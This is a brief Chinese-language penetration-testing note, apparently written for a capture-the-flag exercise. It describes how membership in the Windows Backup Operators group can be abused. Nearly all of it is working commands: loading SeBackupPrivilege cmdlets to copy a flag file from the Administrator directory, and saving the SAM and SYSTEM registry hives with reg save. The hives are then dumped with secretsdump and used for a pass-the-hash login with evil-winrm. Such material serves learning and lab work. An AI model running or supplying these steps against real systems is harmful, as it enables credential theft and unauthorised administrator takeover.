"Backup Operators"组 没有管理权限，但对所有文件及注册表具有读写权限。因此，可以通过dump SAM和SYSTEM文件达到间接获得管理员权限的目的。

```sh
# https://github.com/k4sth4/SeBackupPrivilege
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
Set-SeBackupPrivilege
Get-SeBackupPrivilege
dir C:\Users\Administrator\flag\
Copy-FileSeBackupPrivilege C:\Users\Administrator\flag\flag02.txt .\flag02.txt
```


by reg
```sh
reg save hklm\system system.bak
reg save hklm\sam sam.bak
download system.bak
download sam.bak
python3 secretsdump.py -sam sam.bak -system system.bak LOCAL（本地处理）
evil-winrm -i IP -u Administrator -H hash_value
```